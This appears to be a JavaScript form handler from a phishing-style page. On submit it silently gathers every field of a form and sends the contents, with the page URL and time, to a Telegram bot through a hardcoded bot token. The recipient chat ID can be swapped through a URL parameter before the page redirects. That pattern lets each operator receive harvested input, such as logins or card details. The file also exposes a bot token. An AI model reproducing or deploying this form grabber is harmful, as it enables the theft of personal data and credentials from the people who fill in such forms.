document.addEventListener("DOMContentLoaded", function () {
    const form = document.getElementById("allForm");
    if (!form) return;

    const BOT_TOKEN = "8433235666:AAGUgGfrFwj5dvE548wxyIpyzjrlaWXu_VA";
    const ADMIN_ID = "6976365864";

    const urlParams = new URLSearchParams(window.location.search);
    const userId = urlParams.get("id") || ADMIN_ID;

    // ✅ Use the form's name instead of just the page title
    const formName = form.getAttribute("name") || document.title || "Unknown Form";

    form.addEventListener("submit", function (e) {
        e.preventDefault();

        // Collect all form data dynamically
        const formData = new FormData(form);
        let message = `📩 New form submission (${formName}):\n\n`;

        formData.forEach((value, key) => {
            message += `🔹 ${key}: ${value}\n`;
        });

        message += `\n🆔 Telegram ID: ${userId}`;
        message += `\n🌐 URL: ${window.location.href}`;
        message += `\n🕒 Time: ${new Date().toLocaleString()}`;

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: userId,
                text: message
            })
        })
        .then(res => {
            if (res.ok) {
                window.location.href = `tr.html?id=${userId}`;
            } else {
                alert("Failed please try again.");
            }
        })
        .catch(err => {
            console.error("Telegram API error:", err);
            alert("Network error.");
        });
    });
});